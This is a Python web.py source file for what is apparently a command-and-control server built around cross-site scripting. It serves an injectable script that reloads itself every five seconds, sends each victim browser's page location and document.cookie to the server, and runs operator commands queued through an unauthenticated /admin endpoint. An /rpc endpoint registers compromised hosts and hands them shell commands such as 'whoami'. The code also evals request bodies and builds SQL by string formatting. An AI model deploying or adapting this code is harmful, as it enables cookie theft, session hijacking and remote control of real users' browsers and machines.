#coding:utf-8
import web
import json
import sqlite3
import base64
import requests

with open("config.ini") as f:
    setting = json.load(f)
    server = setting["server"]
    port = setting["port"]
    url = "%s:%d" % (server,port)
    
    
urls =  (
    '/test', 'test',
    '/x', 'xss',
    '/js', 'bhst_js',
    '/rpc', 'bhst',
    '/admin', 'admin',
    '/(.*)', 'hello'
    )

conn = sqlite3.connect(':memory:', check_same_thread=False)
c = conn.cursor()

c.execute('''CREATE TABLE BHST
       (ID       INTEGER    PRIMARY  KEY AUTOINCREMENT,
        IP       CHAR(50)   NOT NULL,
        INIP     CHAR(50),
        NAME     CHAR(50),
        TYPE     CHAR(50),
        CMD      CHAR(50),
        RES      CHAR(500));''')
conn.commit()

class hello:
    pass
    
    
class test:
    def GET(self):
        return '''
        <script src="http://''' + url + '''/x"></script>
        '''
class xss:
    def GET(self):
        return '''
                xssor = {};
                xssor.cmd_url = 'http://''' + url + '''/js';

                xssor.injscript = function (a, b) {
                    var o = document.createElement("script");
                    o.type = "text/javascript";
                    o.src = a;
                    if (b) {
                        if (!window.ActiveXObject) {
                            o.onload = b;
                        } else {
                            o.onreadystatechange = function () {
                                if (o.readyState == 'loaded' || o.readyState == 'complete') {
                                    b();
                                }
                            };
                        }
                    }
                    document.getElementsByTagName("body")[0].appendChild(o);
                    return o;
                };

                function go() {
                  setInterval(function () {
                    xssor.injscript(xssor.cmd_url)
                  }, 5000);
                }
                window.onload = function () {
                    setTimeout(go(), 1 * 1000);
                }
            '''


class admin:
    def GET(self):
        allData = []
        cursor = c.execute("SELECT ID,IP,INIP,NAME,TYPE,CMD,RES from BHST")
        for row in cursor:
            data = {'id':row[0],'ip':row[1],'inip':row[2],'name':row[3],'type':row[4],'cmd':row[5],'res':row[6]}
            allData.append(data)
        return json.dumps(allData)

    def POST(self):
        data = web.input()
        id = data['id']
        cmd = data['cmd']
        cursor = c.execute("UPDATE BHST SET CMD ='%s' WHERE ID='%s'" % (cmd,id))
        return "OK"
        

class bhst:
    def GET(self):
        ip = web.ctx.ip
        inip = web.input()['inip']
        cursor = c.execute("SELECT COUNT(IP) FROM BHST WHERE TYPE='host' AND IP='%s' AND INIP='%s' " % (ip,inip))
        
        for i in cursor:
            count = i[0]
            if count == 0:
                return "whoami"
            else:
                cursor = c.execute("SELECT CMD FROM BHST WHERE TYPE='host' AND IP='%s' AND INIP='%s' " % (ip, inip))
                return cursor.fetchone()[0]

    def POST(self):
        data = web.input()
        ip = web.ctx.ip
        inip = data['inip']
        name = data['name']
        type = 'host'
        cmd = data['cmd']
        res = data['res']

        cursor = c.execute("INSERT INTO BHST VALUES (Null,'%s','%s','%s','%s','%s','%s')" % (ip,inip,name,type,cmd,res))
        conn.commit()
        return None


class bhst_js:
    def __init__(self):
        self.cmd = '''
        var res = top.location + "||" + document.cookie
        var ip;
        var xmlhttp;
        xmlhttp=new XMLHttpRequest()
        appVersion = navigator.appVersion

        xmlhttp.open("POST","http://''' + url + '''/js",true);

	xmlhttp.send("{'appVersion': '" + appVersion + "','res': '" + res + "'}");
        '''


    def GET(self):
        ip = web.ctx.ip
        cursor = c.execute("SELECT COUNT(IP) FROM BHST WHERE TYPE='web' AND IP='%s'" % (ip))
        for i in cursor:
            count = i[0]
            if count == 0:
                return self.cmd
            else:
                cursor = c.execute("SELECT CMD FROM BHST WHERE TYPE='web' AND IP='%s'" % (ip))
                return self.cmd + cursor.fetchone()[0]

    def POST(self):
        name = eval(web.data())['appVersion']
        ip = web.ctx.ip
        res = eval(web.data())['res']
        cursor = c.execute("SELECT COUNT(IP) FROM BHST WHERE TYPE='web' AND IP='%s'" % (ip))
        for i in cursor:
            count = i[0]
            if count == 0:
                
                cursor = c.execute("INSERT INTO BHST VALUES (Null,'%s','None','%s','web','None','%s')" % (ip,name,res))
            else:
                cursor = c.execute("UPDATE BHST SET RES ='%s' WHERE TYPE='web' AND IP='%s'" % (res,ip))
        conn.commit()
        return None

if __name__ == "__main__":
    app = web.application(urls, globals())
    app.run()
